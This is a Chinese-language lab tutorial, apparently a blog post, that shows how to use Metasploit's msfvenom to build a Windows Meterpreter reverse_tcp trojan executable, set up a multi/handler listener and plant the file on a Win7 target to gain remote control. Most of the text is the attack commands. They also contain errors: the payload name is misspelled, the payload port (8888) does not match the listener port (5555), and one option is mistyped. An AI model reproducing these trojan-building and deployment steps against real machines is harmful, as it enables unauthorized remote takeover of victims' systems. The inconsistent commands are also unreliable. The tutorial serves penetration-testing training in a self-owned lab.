本期使用工具：Metasploit  虚拟机：kali（2021.2版本）攻击机一台  win7靶机一台

本期目标：在kali虚拟机中使用metasploit生成木马文件，植入win7虚拟机后远程控制靶机

在kali命令行下输入：msfconsole启动Metasploit

![](../Images/1936e10455af715369148f79c3144a53.png)

   

我们可以输入msfvenom -l payloads查看所以的payload。

本次我们使用的是payload是：windows/metepreter/reverse\_tcp,它有两个需要设置的参数：LHOST:主控端IP，也就是我们kali的IP

 LPORT:使用的端口

我们在命令行输入：msfvenom -p windows/metepreter/reverse\_tcp  lhost=192.168.198.138  lport=8888 -f exe -o /home/kali/Desktop/payload.exe

这样metasploit就生成了一个木马文件！

![](../Images/99bf1ef7dc946deb0ed58f009acd9623.png)

  

我们在kali命令行依次输入：

Use exploit/multi/handler

Set payload windows/meterpreter/reverse\_tcp

Set lhost 192.168.198.138

Set lpot 5555

run

这样我们的主控端就启动监听了：

 

![](../Images/699475fd066603db926897416f05b42c.png)

接下我们把生成的payload.exe文件植入win7靶机并运行，你就会在kali上看见这个：

![](../Images/e47931b08537ed2685693f65f6524f5c.png)

    

这就表明我们已经取得了win7虚拟机的控制权，这样我们就可以进行其他渗透测试的内容了，好了本期的内容就分享到这了，你学会了吗？
